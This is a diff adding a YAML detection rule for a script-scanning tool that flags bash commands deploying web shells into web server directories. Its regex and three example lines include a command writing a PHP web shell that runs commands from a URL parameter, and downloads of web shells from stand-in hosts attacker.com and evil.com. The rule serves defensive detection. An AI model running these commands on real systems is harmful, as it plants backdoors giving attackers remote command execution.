@@ -1,0 +1,35 @@
+# Bash Pattern: Web Shell Indicators
+# Detects web shell deployment and usage patterns
+
+id: BASH-017
+name: Web Shell Deployment Indicators
+description: |
+  Detects patterns associated with web shell deployment and usage. Attackers
+  deploy web shells to maintain persistent access to compromised web servers.
+  This pattern identifies common web shell file operations, suspicious file
+  writes to web directories, and web shell execution patterns.
+languages:
+  - bash
+detection_type: regex
+detection_logic: '(?:echo.*<\?php.*system.*>.*(?:/var/www|/usr/share/nginx|/var/www/html)|curl.*\.php.*-o.*(?:/var/www|htdocs)|wget.*shell\.php.*-O.*(?:/var/www|public_html))'
+severity: High
+mitre_technique: T1505.003
+confidence: 0.85
+category: persistence
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1505/003/"
+    - "https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/"
+  tags:
+    - bash
+    - webshell
+    - persistence
+    - backdoor
+  examples:
+    - "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"
+    - "curl http://attacker.com/c99.php -o /var/www/html/admin/shell.php"
+    - "wget http://evil.com/webshell.php -O /usr/share/nginx/html/uploads/backdoor.php"
